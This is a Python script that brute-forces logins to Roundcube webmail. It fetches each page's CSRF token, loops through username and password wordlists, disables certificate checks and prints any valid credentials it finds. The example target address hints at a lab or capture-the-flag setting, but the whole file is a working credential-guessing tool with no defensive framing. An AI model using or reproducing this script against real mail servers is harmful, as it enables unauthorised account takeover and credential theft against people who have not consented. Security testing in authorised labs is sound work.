	#!/usr/bin/env python3
	import argparse
	import re
	import sys
	import time
	import requests
	from urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
	
	TOKEN_REGEX = re.compile(r'name="_token"\s+value="([^"]+)"')
	
	
	def get_token(session, url):
	    r = session.get(url, verify=False, timeout=10)
	    match = TOKEN_REGEX.search(r.text)
	    if not match:
	        raise RuntimeError("Could not find CSRF token")
	    return match.group(1)
	
	
	def try_login(base_url, username, password):
	    session = requests.Session()
	    login_url = base_url.rstrip("/") + "/"
	
	    token = get_token(session, login_url)
	
	    data = {
	        "_token": token,
	        "_task": "login",
	        "_action": "login",
	        "_timezone": "America/Phoenix",
	        "_url": "",
	        "_user": username,
	        "_pass": password,
	    }
	
	    r = session.post(
	        login_url + "?_task=login",
	        data=data,
	        verify=False,
	        timeout=30,
	        allow_redirects=True,
	    )
	
	    body = r.text
	
	    if "Invalid request! No data was saved." in body:
	        return False, "stale_token"
	
	    if "Login failed." in body:
	        return False, "bad_creds"
	
	    if r.status_code != 401:
	        return True, f"status_{r.status_code}"
	
	    return False, "unknown_fail"
	
	
	def load_lines(path):
	    with open(path, "r", encoding="utf-8", errors="ignore") as f:
	        return [line.strip() for line in f if line.strip()]
	
	
	def main():
	    parser = argparse.ArgumentParser(description="Roundcube CSRF-aware login tester")
	    parser.add_argument("-u", "--url", required=True, help="Roundcube URL, e.g. https://10.10.155.5/mail/")
	    parser.add_argument("-U", "--users", required=True, help="Username file")
	    parser.add_argument("-P", "--passwords", required=True, help="Password file")
	    parser.add_argument("-d", "--delay", type=float, default=0.2, help="Delay between attempts")
	    args = parser.parse_args()
	
	    users = load_lines(args.users)
	    passwords = load_lines(args.passwords)
	
	    print(f"[+] Loaded {len(users)} users")
	    print(f"[+] Loaded {len(passwords)} passwords")
	    print(f"[+] Target: {args.url}")
	
	    for password in passwords:
	        for username in users:
	            try:
	                success, reason = try_login(args.url, username, password)
	                print(f"[-] {username}:{password} -> {reason}")
	
	                if success:
	                    print("\n[+] VALID CREDENTIALS FOUND")
	                    print(f"[+] Username: {username}")
	                    print(f"[+] Password: {password}")
	                    sys.exit(0)
	
	                time.sleep(args.delay)
	
	            except KeyboardInterrupt:
	                print("\n[!] Stopped by user")
	                sys.exit(1)
	            except Exception as e:
	                print(f"[!] Error testing {username}:{password} -> {e}")
	
	    print("\n[-] No valid credentials found")
	
	
	if __name__ == "__main__":
	    main()
